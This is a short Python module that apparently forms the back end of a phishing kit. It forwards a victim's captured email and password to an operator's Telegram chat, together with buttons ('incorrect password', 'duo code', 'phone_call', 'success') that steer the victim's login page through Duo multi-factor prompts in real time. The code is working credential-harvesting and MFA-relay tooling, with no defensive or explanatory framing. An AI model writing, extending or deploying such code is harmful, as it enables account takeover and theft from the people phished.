import requests
import json
from dotenv import load_dotenv
import os
from urllib.parse import quote

# --- Load Environment Variables ---
load_dotenv()
BOT_TOKEN = os.environ.get('BOT_TOKEN')
DEFAULT_USER_ID = os.environ.get('USER_ID') # Default user from .env
HOSTED_URL = os.environ.get('HOSTED_URL')


def send_notification(text, user_id=None):
    """
    Sends a plain text notification to a specified Telegram user.
    If no user_id is provided, it falls back to the default user.
    """
    base_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    # Use the provided user_id, otherwise fall back to the default from .env
    chat_id = user_id if user_id else DEFAULT_USER_ID

    payload = {
        'chat_id': chat_id,
        'text': text
    }
    try:
        response = requests.post(base_url, data=payload)
        response.raise_for_status()
        print(f"Message sent successfully to (ID: {chat_id}).")
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to (ID: {chat_id}): {e}")


def get_status_update(email, password, user_id=None):
    """
    Sends credentials to the specified Telegram user with status control buttons.
    The button URLs now include the user_id for the callback.
    """
    base_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    # Use the provided user_id, otherwise fall back to the default from .env
    chat_id = user_id if user_id else DEFAULT_USER_ID
    
    text = f"New Login Attempt:\n\nEmail: {email}\nPassword: {password}"

    payload = {
        'chat_id': chat_id,
        'text': text,
    }

    statuses = [
        'incorrect password',
        'mobile notification',
        'duo code',
        'phone_call',
        'incorrect duo code',
        'success'
    ]
    
    # Build keyboard with the new callback URL format: /set_status/<user_id>/<email>/<status>
    keyboard_layout = [
        [
            {
                'text': status,
                'url': f"{HOSTED_URL}/set_status/{chat_id}/{quote(email)}/{quote(status)}"
            }
        ]
        for status in statuses
    ]

    inline_keyboard = {'inline_keyboard': keyboard_layout}
    payload['reply_markup'] = json.dumps(inline_keyboard)

    try:
        response = requests.post(base_url, data=payload)
        response.raise_for_status()
        print(f"Status update request sent successfully to (ID: {chat_id}).")
    except requests.exceptions.RequestException as e:
        print(f"Error sending status update to (ID: {chat_id}): {e}")
        if e.response is not None:
            print(f"Response content: {e.response.text}")